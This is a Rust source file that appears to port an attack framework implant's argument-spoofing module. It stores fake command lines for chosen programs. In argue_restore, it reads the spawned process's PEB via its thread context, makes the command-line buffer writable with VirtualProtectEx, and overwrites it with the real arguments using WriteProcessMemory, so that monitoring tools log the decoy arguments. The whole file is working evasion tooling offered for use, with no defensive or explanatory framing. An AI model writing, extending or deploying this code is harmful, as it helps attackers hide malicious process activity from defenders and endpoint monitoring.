//! Argument spoofing (argue.cpp).

use crate::bformat::FormatP;
use crate::callback::Callback;
use crate::commands::CALLBACK_PENDING;
use crate::filesys::env_expand;
use crate::parse::{data_alloc, DataP};
use parking_lot::Mutex;

/// Argument record (ARGUMENT_RECORD).
#[derive(Clone, Default)]
pub struct ArgumentRecord {
    pub fakeargs: Vec<u8>,
    pub realargs: Vec<u8>,
    pub length: u32,
}

struct ArgueEntry {
    active: bool,
    command: Vec<u8>,
    fakeargs: Vec<u8>,
}

static ARGUE_LIST: Mutex<Vec<ArgueEntry>> = Mutex::new(Vec::new());

fn get_slot(command: &[u8]) -> usize {
    let mut list = ARGUE_LIST.lock();
    // find a duplicate
    for (i, entry) in list.iter().enumerate() {
        if entry.active && entry.command == command {
            return i;
        }
    }
    // find an empty entry
    for (i, entry) in list.iter().enumerate() {
        if !entry.active {
            return i;
        }
    }
    // allocate a new entry
    list.push(ArgueEntry {
        active: false,
        command: Vec::new(),
        fakeargs: Vec::new(),
    });
    list.len() - 1
}

pub fn command_argue_add(buffer: &[u8], length: usize) {
    let mut alloc = data_alloc(8192 * 3);
    let mut command = vec![0u8; 8192];
    let mut expanded = vec![0u8; 8192];
    let mut fakeargs = vec![0u8; 8192];

    let mut parser = DataP::init(&mut buffer.to_vec());
    let _ = parser.data_string(&mut command, 8192);
    let clen = command.iter().position(|&c| c == 0).unwrap_or(command.len());
    env_expand(&command[..clen], &mut expanded, 8192);
    let _ = parser.data_string(&mut fakeargs, 8192);

    // find the slot and activate it
    let elen = expanded.iter().position(|&c| c == 0).unwrap_or(expanded.len());
    let idx = get_slot(&expanded[..elen]);
    {
        let mut list = ARGUE_LIST.lock();
        list[idx].active = true;
        env_expand(&command[..clen], &mut list[idx].command, 8192);
        let flen = fakeargs.iter().position(|&c| c == 0).unwrap_or(fakeargs.len());
        env_expand(&fakeargs[..flen], &mut list[idx].fakeargs, 8192);
    }

    alloc.cleanup();
}

pub fn command_argue_remove(buffer: &[u8], length: usize) {
    let mut exp = vec![0u8; 8192];
    let mut buf = buffer.to_vec();
    if length < buf.len() {
        buf[length] = 0;
    }
    env_expand(&buf, &mut exp, 8192);
    let elen = exp.iter().position(|&c| c == 0).unwrap_or(exp.len());

    let mut list = ARGUE_LIST.lock();
    for entry in list.iter_mut() {
        if entry.active && entry.command == &exp[..elen] {
            entry.active = false;
            entry.command.clear();
            entry.fakeargs.clear();
        }
    }
    exp.fill(0);
}

pub fn command_argue_list(callback: Callback) {
    let list = ARGUE_LIST.lock();
    let mut format = FormatP::init(32768);
    for entry in list.iter() {
        if entry.active {
            format.bformat_printf(format_args!("{}\t{}\n", String::from_utf8_lossy(&entry.command), String::from_utf8_lossy(&entry.fakeargs)));
        }
    }
    let data = format.bformat_string().to_vec();
    let len = format.bformat_length();
    callback(&data, len as i32, CALLBACK_PENDING);
    format.free();
}

/// Check if the specified command is a candidate for argument spoofing.
pub fn argue_should_spoof(buffer: &[u8], record: &mut ArgumentRecord) -> bool {
    let mut command = vec![0u8; 8192];
    let mut args = vec![0u8; 8192];

    // split the buffer into command + args (first space)
    let mut split = buffer.len();
    for (i, b) in buffer.iter().enumerate() {
        if *b == b' ' {
            split = i;
            break;
        }
    }
    command[..split].copy_from_slice(&buffer[..split]);
    args[..buffer.len() - split].copy_from_slice(&buffer[split..]);

    let clen = command.iter().position(|&c| c == 0).unwrap_or(command.len());
    let list = ARGUE_LIST.lock();
    for entry in list.iter() {
        if entry.active && entry.command == &command[..clen] {
            record.realargs = buffer.to_vec();
            record.fakeargs = entry.fakeargs.clone();
            record.length = entry.fakeargs.len() as u32;
            return true;
        }
    }
    false
}

/// Restore real arguments into the spawned process's PEB (argue_restore).
/// Implemented for x64 (the port target); the x86 variant is equivalent.
pub fn argue_restore(
    pi: *mut core::ffi::c_void,
    record: &ArgumentRecord,
) -> bool {
    unsafe {
        use windows_sys::Win32::Foundation::GetLastError;
        use windows_sys::Win32::System::Diagnostics::Debug::{GetThreadContext, ReadProcessMemory, WriteProcessMemory, CONTEXT, CONTEXT_INTEGER_AMD64};
        use windows_sys::Win32::System::Memory::VirtualProtectEx;
        let pi = pi as *mut windows_sys::Win32::System::Threading::PROCESS_INFORMATION;

        // probably not going to work in a wow64 context
        if !crate::ps::is_x64_process((*pi).hProcess as isize) {
            crate::callback::post_error_na(0x43);
            return false;
        }

        let mut ctx: CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = CONTEXT_INTEGER_AMD64;
        if GetThreadContext((*pi).hThread, &mut ctx) == 0 {
            crate::callback::post_error_d(0x41, GetLastError() as i32);
            return false;
        }

        // Rdx+0x20 -> RTL_USER_PROCESS_PARAMETERS
        let mut rtl_user_proc_params_address: *mut core::ffi::c_void = std::ptr::null_mut();
        if ReadProcessMemory(
            (*pi).hProcess,
            (ctx.Rdx as usize + 0x20) as *const _,
            &mut rtl_user_proc_params_address as *mut _ as *mut _,
            std::mem::size_of::<*mut core::ffi::c_void>(),
            std::ptr::null_mut(),
        ) == 0
        {
            crate::callback::post_error_d(0x41, GetLastError() as i32);
            return false;
        }

        // +0x70 -> UNICODE_STRING commandLine
        let mut command_line: windows_sys::Win32::Foundation::UNICODE_STRING = std::mem::zeroed();
        if ReadProcessMemory(
            (*pi).hProcess,
            (rtl_user_proc_params_address as usize + 0x70) as *const _,
            &mut command_line as *mut _ as *mut _,
            std::mem::size_of::<windows_sys::Win32::Foundation::UNICODE_STRING>(),
            std::ptr::null_mut(),
        ) == 0
        {
            crate::callback::post_error_d(0x41, GetLastError() as i32);
            return false;
        }

        // make the permissions good
        let mut old: u32 = 0;
        if VirtualProtectEx(
            (*pi).hProcess,
            command_line.Buffer as *mut core::ffi::c_void,
            command_line.MaximumLength as usize,
            windows_sys::Win32::System::Memory::PAGE_READWRITE,
            &mut old,
        ) == 0
        {
            crate::callback::post_error_d(0x41, GetLastError() as i32);
            return false;
        }

        // convert our command line contents
        let mut command_line_contents = vec![0u16; command_line.MaximumLength as usize / 2];
        if !crate::commands::to_wide_char(&record.realargs, &mut command_line_contents, command_line.MaximumLength as usize / 2) {
            crate::callback::post_error_na(0x42);
            return false;
        }

        // push it!
        let mut wrote: usize = 0;
        if WriteProcessMemory(
            (*pi).hProcess,
            command_line.Buffer as *const core::ffi::c_void,
            command_line_contents.as_ptr() as *const core::ffi::c_void,
            command_line.MaximumLength as usize,
            &mut wrote,
        ) == 0
        {
            crate::callback::post_error_d(0x41, GetLastError() as i32);
            return false;
        }
        true
    }
}
